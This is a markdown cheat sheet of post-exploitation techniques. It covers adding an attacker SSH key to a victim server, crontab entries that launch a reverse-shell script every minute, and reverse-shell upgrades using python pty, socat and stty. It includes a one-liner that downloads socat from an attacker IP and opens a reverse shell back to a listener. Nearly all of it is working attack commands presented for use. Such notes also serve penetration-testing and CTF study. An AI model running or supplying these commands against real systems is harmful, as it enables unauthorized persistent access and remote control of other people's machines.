[generate an ssh key on attacker server](https://docs.github.com/en/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent)


### create ssh keys

on attacker server
```
echo "./user_rsa" | ssh-keygen -t rsa -b 4096 -C "your_email@example.com"; chmod 600 ./user_rsa; cat ./user_rsa.pub
```

on victim server
```
echo "" >> ~/.ssh/authorized_keys
```

on attacker server
```
ssh -i id_rsa user@${box_ip}
```

### basic reverse shells [revshell generator](https://www.revshells.com/)

**crontab reverse shells (every minute)**

```
* * * * *    /lib/systemd/revshell.sh
* * * * *    /usr/bin/revshell.sh
```
### upgrade revserse shells

**python**
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

**socat** - [get socat here](https://github.com/andrew-d/static-binaries)

```bash
(load onto target box)

wget -q https://10.10.10.10:8000/socat -O /tmp/socat; chmod +x /tmp/socat

(listener)

socat file:`tty`,raw,echo=0 tcp-listen:4444

(target box)

/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444

(target oneliner)

wget -q https://10.10.10.10:8000/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

**stty**

```bash
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows 38 columns 116
```